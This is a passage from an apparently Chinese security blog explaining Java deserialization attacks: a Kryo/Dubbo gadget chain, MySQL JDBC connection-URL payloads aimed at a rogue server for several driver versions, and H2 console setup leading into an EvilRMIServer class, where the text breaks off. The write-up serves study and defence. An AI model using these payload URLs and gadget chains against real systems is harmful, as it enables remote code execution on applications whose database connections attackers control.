title="Registration获取"></a>Registration获取</h4><p><code>writeClass(output, object.getClass())</code>返回一个<code>object</code>类的<code>Registration</code></p><p>若该类没有注册过（也就是没有上面的<code>kryo.register</code>指定一个类），会自动使用默认的序列化器注册，注册有两个目的：获取序列化器和类的唯一标识Id，方便后续的序列化和反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">get:<span class="hljs-number">351</span>, ObjectMap (com.esotericsoftware.kryo.util)<br>getRegistration:<span class="hljs-number">79</span>, DefaultClassResolver (com.esotericsoftware.kryo.util)<br>getRegistration:<span class="hljs-number">488</span>, Kryo (com.esotericsoftware.kryo)<br>writeClass:<span class="hljs-number">97</span>, DefaultClassResolver (com.esotericsoftware.kryo.util)<br>writeClass:<span class="hljs-number">540</span>, Kryo (com.esotericsoftware.kryo)<br>writeClassAndObject:<span class="hljs-number">645</span>, Kryo (com.esotericsoftware.kryo)<br>main:<span class="hljs-number">16</span>, Test<br></code></pre></td></tr></table></figure><p><code>com.esotericsoftware.kryo.util.ObjectMap</code>类维护了一个<code>Class</code>与<code>Registration</code>（含相对应的反序列化器）的对应表：</p><p><img src="/2024/08/14/Kyro/image-20240814215910090.png" alt="image-20240814215910090"></p><p>当然我们自定义的类肯定在这个表中找不到，里面都是Java的基础类，<code>DefaultClassResolver#getRegistration</code>就返回null。</p><p>接着进入<code>registerImplicit</code> -&gt; <code>getDefaultSerializer</code>继续找一些Java内置类是否和待序列化类对应</p><p><img src="/2024/08/14/Kyro/image-20240814215948131.png" alt="image-20240814215948131"></p><p>继续跟进，发现<code>FieldSerializer</code>作为默认序列化器，并在<code>FieldSerializer#rebuildCachedFields</code>中获取序列化类的<code>Fields</code>，忽略静态成员。</p><p><img src="/2024/08/14/Kyro/image-20240814220004870.png" alt="image-20240814220004870"></p><p>到此就获取到了自定义类的<code>Registration</code>。</p><h4 id="Field序列化"><a href="#Field序列化" class="headerlink" title="Field序列化"></a>Field序列化</h4><p>接着进入<code>FieldSerializer.write(this, output, object);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">CachedField[] fields = <span class="hljs-built_in">this</span>.fields;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, n = fields.length; i &lt; n; i++)<br>    fields[i].write(output, object);<br></code></pre></td></tr></table></figure><p><code>Kryo</code>封装了一个<code>UnsafeUtil</code>（<code>Unsafe</code>对象通过反射获取）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> sun.misc.Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>);<br>_unsafe = (sun.misc.Unsafe)field.get(<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>在JVM中，对实例的Field进行了有规律的存储，通过一个偏移量可以从内存中找到相应的Field值</p><p>unsafe实现了在内存层面，通过成员字段偏移量offset来获取对象的属性值</p><p>接着获取成员的序列化器，步骤跟上面的一样（<code>getRegistration(type).getSerializer()</code>）</p><p><img src="/2024/08/14/Kyro/image-20240814220143706.png" alt="image-20240814220143706"></p><p>剩下的就是继续递归所有成员，获取序列化器进行序列化。</p><h3 id="反序列化流程"><a href="#反序列化流程" class="headerlink" title="反序列化流程"></a>反序列化流程</h3><p>同样也是先获取类的<code>Registration</code>，再从<code>Registration</code>拿序列化器。</p><p><img src="/2024/08/14/Kyro/image-20240814220215114.png" alt="image-20240814220215114"></p><p><code>FieldSerializer#read</code>首先对类进行实例化，这里是使用了Kryo封装的<code>com.esotericsoftware.reflectasm#ConstructorAccess</code>去构造类对象，基于ASM，还没学过ASM，就不深入跟进去看了。</p><p><img src="/2024/08/14/Kyro/image-20240814220231804.png" alt="image-20240814220231804"></p><p>同样是获取成员的序列化器，递归调用<code>readObject</code>：</p><p><img src="/2024/08/14/Kyro/image-20240814220247330.png" alt="image-20240814220247330"></p><p>可以跟一下这里的<code>readObjectOrNull</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">object = (T)serializer.read(<span class="hljs-built_in">this</span>, input, type);<br></code></pre></td></tr></table></figure><p>这里的序列化器是<code>StringSerializer</code>，直接从输入流input读取了，否则就继续调用上面的<code>FieldSerializer#read</code>了</p><p>后面的<code>setField</code>也是用<code>unsafe</code>从内存层面往成员偏移量处填充值</p><p><img src="/2024/08/14/Kyro/image-20240814220307247.png" alt="image-20240814220307247"></p><p>反序列化结束。</p><p>可总结为：</p><p><img src="/2024/08/14/Kyro/image-20240814220339130.png" alt="image-20240814220339130"></p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>网上找到的Kryo反序列化问题都是在Dubbo那块的。</p><p>Dubbo默认的序列化协议是Hessian，但可以修改Dubbo协议数据包中的header，指定SerializationID，来确定Consumer和Provider通信使用的序列化协议，这里就不细讲Dubbo数据包的修改了，而是抽取其中关键的Kryo反序列化，Dubbo相关的具体可以看<a href="https://p4d0rn.gitbook.io/java/serial-journey/dubbo">大佬写的</a>。</p><p><strong>调用栈</strong></p><blockquote><p>getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</p><p>newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</p><p>getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</p><p>write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)</p><p>write:270, MapSerializer (com.alibaba.fastjson.serializer)</p><p>write:44, MapSerializer (com.alibaba.fastjson.serializer)</p><p>write:280, JSONSerializer (com.alibaba.fastjson.serializer)</p><p>toJSONString:863, JSON (com.alibaba.fastjson)</p><p>toString:857, JSON (com.alibaba.fastjson)</p><p>equals:392, XString (com.sun.org.apache.xpath.internal.objects)</p><p>equals:104, HotSwappableTargetSource (org.springframework.aop.target)</p><p>putVal:635, HashMap (java.util)</p><p>put:612, HashMap (java.util)</p><p>read:162, MapSerializer (com.esotericsoftware.kryo.serializers)</p><p>read:39, MapSerializer (com.esotericsoftware.kryo.serializers)</p><p>readClassAndObject:813, Kryo (com.esotericsoftware.kryo)</p></blockquote><p>Kryo从input中读取解析到type为HashMap</p><p>因此会调用<code>MapSerializer</code>序列化器来读取input中的信息</p><p>既然是Map的反序列化就肯定涉及到键值对的处理</p><p><code>MapSerializer</code>会将解析到的key和value都通过调用<code>map.put()</code>来放入HashMap对象中</p><p>接着调用<code>putVal()</code>，<code>equals()</code>判断两个键是否相对</p><p><code>com.sun.org.apache.xpath.internal.objects.XString#equals</code>会调用<code>toString</code></p><p><img src="/2024/08/14/Kyro/image-20240814220600476.png" alt="image-20240814220600476"></p><p><code>org.springframework.aop.target.HotSwappableTargetSource#equals</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object other)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span> == other || other <span class="hljs-keyword">instanceof</span> HotSwappableTargetSource &amp;&amp; <span class="hljs-built_in">this</span>.target.equals(((HotSwappableTargetSource)other).target);<br>&#125;<br></code></pre></td></tr></table></figure><p>多套一个<code>HotSwappableTargetSource</code>是为了让HashMap的<code>putVal</code>能走到<code>equals</code></p><p>这里触发<code>com.alibaba.fastjson.JSON</code>类的<code>toString()</code>函数，进而调用<code>JSONSerializer</code>的<code>write()</code>函数，从而触发Fastjson Gadget。</p><p>参考：</p><ul><li><a href="https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/">浅析Dubbo Kryo&#x2F;FST反序列化漏洞（CVE-2021-25641）Mi1k7ea</a></li><li><a href="https://p4d0rn.gitbook.io/java/serial-journey/kryo#kryo-de-zhu-ce">Kryo | Java (gitbook.io)</a></li><li><a href="https://www.cnblogs.com/bitterz/p/15588955.html">Dubbo的反序列化安全问题——kryo和fst - bitterz - 博客园 (cnblogs.com)</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDBC</title>
    <link href="/2024/08/13/JDBC/"/>
    <url>/2024/08/13/JDBC/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>JDBC（Java DataBase Connectivity）是SUN公司发布的一个java程序与数据库之间通信的接口（规范），各大数据库厂商去实现JDBC规范，并将实现类打包成jar包。</p><p><img src="/2024/08/13/JDBC/image-20240813152834923.png" alt="image-20240813152834923"></p><p>由于JDK版本的提升以及依赖包的更新，各种恶意类方面的反序列化都或多或少收到影响，能打的链子也会越来越少，但是JDBC把数据库机制引入，使得在当前大环境下Java漏洞不仅仅局限在java方面，也可以配合数据库方面进行attack，这种方式仍旧经久不衰，足见JDBC攻击的适应性之强。</p><p>所以Hessian我还是放到后面再说，这里先把JDBC浅浅引入一下。</p><h2 id="MySQL-JDBC"><a href="#MySQL-JDBC" class="headerlink" title="MySQL-JDBC"></a>MySQL-JDBC</h2><h3 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h3><p>进行数据库连接时指定了数据库的URL及连接配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br></code></pre></td></tr></table></figure><p>若JDBC连接的URL被攻击者控制，就可以让其指向恶意的MySQL服务器</p><p>JDBC连接MySQL服务端时，会有几个内置的SQL查询语句会执行，查询的结果集会在MySQL客户端被处理时会调用<code>ObjectInputStream#readObject</code>进行反序列化。</p><p>攻击者可以搭建恶意MySQL服务器，返回精心构造的查询结果集，进行客户端反序列化攻击。</p><p>可被利用的两条查询语句：</p><ul><li>SHOW SESSION STATUS</li><li>SHOW COLLATION</li></ul><p>恶意MySQL服务器搭建：</p><ul><li><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a> 📌</li><li><a href="https://github.com/rmb122/rogue_mysql_server">https://github.com/rmb122/rogue_mysql_server</a></li></ul><p>上述工具是模拟MySQL发包过程用的，只需要开对应端口运行脚本就可以了。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jdbc_url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/test?&quot;</span> +<br>            <span class="hljs-string">&quot;autoDeserialize=true&quot;</span> + <span class="hljs-string">&quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections7_calc&quot;</span>;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> DriverManager.getConnection(jdbc_url, <span class="hljs-string">&quot;yso_CommonsCollections7_calc&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">DriverManager#getConnection<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">connectOneTryOnly=&gt;<span class="hljs-built_in">this</span>.session.setQueryInterceptors(<span class="hljs-built_in">this</span>.queryInterceptors);<br></code></pre></td></tr></table></figure><p>设置对应的查询拦截器（即我们指定的<code>ServerStatusDiffInterceptor</code>）</p><p>执行查询语句会调用拦截器的<code>preProcess</code>和<code>postProcess</code></p><p>判断拦截器是否为空，非空则调用<code>invokeQueryInterceptorsPre</code></p><p><img src="/2024/08/13/JDBC/image-20240813174856268.png" alt="image-20240813174856268"></p><p><code>invokeQueryInterceptorsPre</code>调用了拦截器的<code>preProcess</code>：</p><p><img src="/2024/08/13/JDBC/image-20240813174917368.png" alt="image-20240813174917368"></p><p>看到执行了<code>SHOW SESSION STATUS</code>，并将结果（<code>com.mysql.cj.jdbc.result.ResultSetImpl</code>）传入<code>ResultSetUtil#resultSetToMap</code>进行反序列化处理：</p><p><img src="/2024/08/13/JDBC/image-20240813175009305.png" alt="image-20240813175009305"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resultSetToMap</span><span class="hljs-params">(Map mappedValues, ResultSet rs)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">while</span> (rs.next()) &#123;<br>        mappedValues.put(rs.getObject(<span class="hljs-number">1</span>), rs.getObject(<span class="hljs-number">2</span>));<br>    &#125;<br>&#125;<br><span class="hljs-comment">// getObject(2)</span><br><span class="hljs-keyword">if</span> (field.isBinary() || field.isBlob()) &#123;<br>    <span class="hljs-type">byte</span>[] data = getBytes(columnIndex);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>getObject</code>判断MySQL类型为BLOB后，从MySQL服务端获取对应的字节码数据</p><p>从MySQL服务端获取到字节码数据后，判断<code>autoDeserialize</code>是否为true（连接URL中设置了<code>autoDeserialize=true</code>）、字节码数据是否为序列化对象（前两个字节为<code>-84</code>和<code>-19</code>标识序列化对象）等，最后调用<code>readObject</code>触发反序列化漏洞</p><p><img src="/2024/08/13/JDBC/image-20240813175118532.png" alt="image-20240813175118532"></p><p><img src="/2024/08/13/JDBC/image-20240813175141320.png" alt="image-20240813175141320"></p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p><code>ServerStatusDiffInterceptor</code>触发。</p><h4 id="8-x"><a href="#8-x" class="headerlink" title="8.x&lt;&#x3D;8.0.20"></a>8.x&lt;&#x3D;8.0.20</h4><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h4><p><code>queryInterceptors</code>改名<code>statementInterceptors</code></p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="5-1-11"><a href="#5-1-11" class="headerlink" title="&gt;&#x3D;5.1.11"></a>&gt;&#x3D;5.1.11</h4><p>包名不含<code>cj</code></p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="5-x"><a href="#5-x" class="headerlink" title="5.x&lt;&#x3D;5.1.10"></a>5.x&lt;&#x3D;5.1.10</h4><p>同上，需要连接后执行查询</p><h3 id="detectCustomCollations触发"><a href="#detectCustomCollations触发" class="headerlink" title="detectCustomCollations触发"></a><code>detectCustomCollations</code>触发</h3><h4 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29~5.1.40"></a>5.1.29~5.1.40</h4><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="5-1-19-5-1-28"><a href="#5-1-19-5-1-28" class="headerlink" title="5.1.19~5.1.28"></a>5.1.19~5.1.28</h4><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//127.0.0.1:3306/test?autoDeserialize=true</span><br></code></pre></td></tr></table></figure></blockquote><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/jdbc-attack/mysql">MySQL JDBC Attack | Java (gitbook.io)</a></p><p>[MySQL JDBC反序列化漏洞 <a href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"> Mi1k7ea ]</a></p><p><a href="https://www.anquanke.com/post/id/203086">MySQL JDBC 客户端反序列化漏洞分析-安全客 - 安全资讯平台 (anquanke.com)</a></p><h2 id="H2-JDBC"><a href="#H2-JDBC" class="headerlink" title="H2-JDBC"></a>H2-JDBC</h2><p>也曾在HGAME的新生赛上见到了H2数据库的SQL注入&#x3D;&gt;RCE漏洞，而且课内数据库开发我也是用的H2数据库交了一次作业hhh，所以印象还是比较深。</p><p>JDBC是JDK提供的一个用于连接数据库的接口(Java DataBase Connectivity)，各个数据库厂商(MySQL、Oracle、SQLServer)负责编写自己的JDBC实现类，再把这些实现类打包为驱动jar包，我们使用JDBC的接口编程，背后调用的实则是实现类里的方法。</p><p>常见的JDBC使用方法是在配置文件中写好JDBC引擎、连接数据库的URL、账户、密码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>;  <span class="hljs-comment">//test数据库</span><br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_USER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_PASSWORD</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;password&quot;</span>;<br><span class="hljs-comment">// 建立连接</span><br><span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(JDBC_URL, JDBC_USER,<br>JDBC_PASSWORD);<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 访问数据库</span><br><span class="hljs-comment">// 关闭连接</span><br>conn.close();<br></code></pre></td></tr></table></figure><p>那么JDBC连接的URL怎么能够让用户控制得到呢？实际在一些场景或者渗透测试里，比如后台修改数据库配置、测试数据库连接中，管理员就可以控制JDBC的连接URL。</p><p>因此这类漏洞主要是在后台管理(当然第一步得攻进后台，未授权、弱密钥、逻辑漏洞等等等)。</p><p>此处介绍h2 database的相关漏洞。</p><p>H2是一个用Java编写的数据库，支持内存(有点像sqlite)、文件等模式，只有一个jar文件，适合作为嵌入式数据库使用。主要用于单元测试。H2提供了一个web控制台用于操作和管理数据库。</p><h3 id="H2连接"><a href="#H2连接" class="headerlink" title="H2连接"></a>H2连接</h3><p>一般我们会用SpringBoot来整合H2。</p><p>h2 database console可以整合到SpringBoot中，也可以独立启动(其内置了一个WebServer)</p><p>H2支持运行三种模式：</p><p>Embedded(嵌入式)-&gt;无需配置本地&#x2F;远程数据库; 数据库连接关闭时, 数据与表结构依然存在;</p><p>In-Memory(内存模式)-&gt;无需配置本地&#x2F;远程数据库, 但数据库连接关闭时，数据与表结构丢失;</p><p>ServerMode(传统模式)-&gt;需要配置本地&#x2F;远程数据库;</p><h4 id="jar启动"><a href="#jar启动" class="headerlink" title="jar启动"></a>jar启动</h4><p>这里省个事抄了。实际上把h2挂在依赖里，启动项目就能启动H2。</p><p>在<a href="http://www.h2database.com/html/cheatSheet.html">官网</a>下载jar包，调用里面的<code>org.h2.tools.Server</code>类</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">java <span class="hljs-literal">-cp</span> .\h2<span class="hljs-literal">-2</span>.<span class="hljs-number">2.220</span>.jar org.h2.tools.Server <span class="hljs-literal">-help</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/13/JDBC/image-20240813175959888.png" alt="image-20240813175959888"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">java <span class="hljs-literal">-cp</span> .\h2<span class="hljs-literal">-2</span>.<span class="hljs-number">2.220</span>.jar org.h2.tools.Server <span class="hljs-literal">-web</span> <span class="hljs-literal">-webAllowOthers</span><br></code></pre></td></tr></table></figure><p>启动Web console，默认监听8082端口</p><p>H2的Web console不仅可以连接H2数据库，也可以连接其他支持JDBC API的数据库</p><p><img src="/2024/08/13/JDBC/image-20240813180049784.png" alt="image-20240813180049784"></p><p>H2数据库默认用户名为sa、密码为空：</p><p><img src="/2024/08/13/JDBC/image-20240813180102966.png" alt="image-20240813180102966"></p><h4 id="SpringBoot整合"><a href="#SpringBoot整合" class="headerlink" title="SpringBoot整合"></a>SpringBoot整合</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.h2database<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>h2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在<code>application.properties</code>中添加h2连接的配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.datasource.driver-class-name</span>=<span class="hljs-string">org.h2.Driver</span><br><span class="hljs-attr">spring.datasource.url</span>=<span class="hljs-string">jdbc:h2:mem:test</span><br><span class="hljs-attr">spring.datasource.username</span>=<span class="hljs-string">sa</span><br><span class="hljs-attr">spring.datasource.password</span>=<span class="hljs-string"></span><br><br><span class="hljs-attr">spring.h2.console.enabled</span>=<span class="hljs-string">true</span><br><span class="hljs-attr">spring.h2.console.path</span>=<span class="hljs-string">/h2</span><br><span class="hljs-attr">spring.h2.console.settings.trace</span>=<span class="hljs-string">false</span><br><span class="hljs-attr">spring.h2.console.settings.web-allow-others</span>=<span class="hljs-string">true</span><br></code></pre></td></tr></table></figure><p>注意这里springboot可以修改h2 console的访问路径，若未配置此项默认为<code>h2-console</code></p><p>demo就免了，网上一大把。</p><h3 id="H2-JNDI"><a href="#H2-JNDI" class="headerlink" title="H2-JNDI"></a>H2-JNDI</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span 